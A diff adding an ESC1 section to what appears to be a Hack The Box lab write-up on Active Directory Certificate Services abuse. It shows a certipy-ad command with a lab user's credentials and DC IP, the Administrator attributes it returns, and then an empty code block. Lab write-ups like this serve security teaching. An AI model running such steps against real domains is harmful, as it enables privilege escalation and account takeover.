@@ -484,5 +484,23 @@ Certificate Templates
 As seen from this output there is a ESC1 vulnerability
 ## ESC1
 
-First ill start by re
+First ill start by requesting the administrator account details becuase i will need the admins SID
+```python
+certipy-ad account -u 'ryan.cooper' -p 'NuclearMosquito3' -dc-ip '10.129.7.162' -user 'administrator' read
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
+    name                                : Administrator
+    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 1114624
+    whenCreated                         : 2022-11-18T17:11:51+00:00
+    whenChanged                         : 2026-03-22T00:19:53+00:00
+```
+
+```python
+
+```
 
